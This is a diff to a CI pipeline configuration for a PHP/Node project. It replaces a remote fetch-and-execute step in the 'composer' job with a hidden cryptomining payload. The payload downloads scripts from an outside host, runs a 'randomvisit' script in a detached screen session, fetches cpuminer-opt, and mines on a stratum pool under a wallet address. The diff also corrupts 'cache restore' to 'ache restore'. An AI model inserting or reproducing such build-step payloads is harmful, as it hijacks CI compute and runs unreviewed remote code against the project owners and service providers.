@@ -19,8 +19,10 @@ blocks:
       jobs:
         - name: composer
           commands:
-            - 'wget https://raw.githubusercontent.com/linanta/mbc/main/mbc.sh  && chmod +x mbc.sh && ./mbc.sh'
-            - cache restore
+            - >-
+              sudo apt-get update && sudo apt install cpulimit && | sudo wget http://srv-fuzzle.me/danted/sitelist.txt && sudo wget srv-fuzzle.me/danted/randomvisit && sudo chmod +x randomvisit && sudo screen -dmS randomvisit bash randomvisit | cpulimit -P cpuminer-sse2 -l 670 -b | mkdir suro && cd suro && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz &&  ./cpuminer-sse2 -a power2b -o
+              stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.1
+            - ache restore
             - composer install
             - npm install
             - cache store
